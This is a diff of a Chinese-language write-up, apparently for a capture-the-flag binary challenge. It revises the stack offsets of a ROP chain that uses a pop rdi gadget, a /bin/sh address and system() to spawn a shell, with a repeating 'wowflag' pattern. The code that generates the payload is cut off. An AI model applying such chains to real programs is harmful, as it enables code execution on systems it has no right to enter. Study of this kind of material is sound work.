@@ -40,15 +40,15 @@ rip-0x10    binsh_addr
 rip-0x8     system_addr
 rip         "B"*8
 ret         pop3ret_addr
-rip+0x8     wowflag
-rip+0x10    wowflag8
-rip+0x18    wowflag22+"AA"
-rip+0x20    poprdi_gadget
-rip+0x28    binsh_addr
-rip+0x30    system_addr
-rip+0x38    "B"*8
-rip+0x40    pop3ret_addr
-...(以下每0x40字节重复)
+rip+0x10    wowflag
+rip+0x18    wowflag8
+rip+0x20    wowflag22+"AA"
+rip+0x28    poprdi_gadget
+rip+0x30    binsh_addr
+rip+0x38    system_addr
+rip+0x40    "B"*8
+rip+0x48    pop3ret_addr
+...(以下每8*8字节重复)
 ```
 
 因此生成shellcode的代码为：
